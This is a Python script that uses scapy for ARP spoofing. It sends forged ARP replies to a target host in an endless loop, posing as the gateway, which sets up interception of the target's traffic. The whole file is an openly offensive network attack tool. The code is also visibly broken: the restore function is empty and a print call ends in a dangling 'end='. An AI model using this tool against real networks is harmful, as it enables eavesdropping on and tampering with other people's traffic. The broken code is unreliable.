#!/usr/bin/env python

import scapy.all as scapy
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP address")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP address")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify an Target IP address , use --help for more info.")
    elif not options.gateway:
        parser.error("[-] Please specify an Gateway IP address, use --help for more info.")
    return options

def get_mac(ip):
    response, unresponse = scapy.arping(ip, verbose = False)
    mac = response[0][1].hwsrc
    return mac

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, timeout =1, verbose = False)

def restore():


options = get_arguments()
counter = 0
while True:
   spoof(options.target, options.gateway)
   print("\r Send packet: ", counter, end=)
   counter +=1


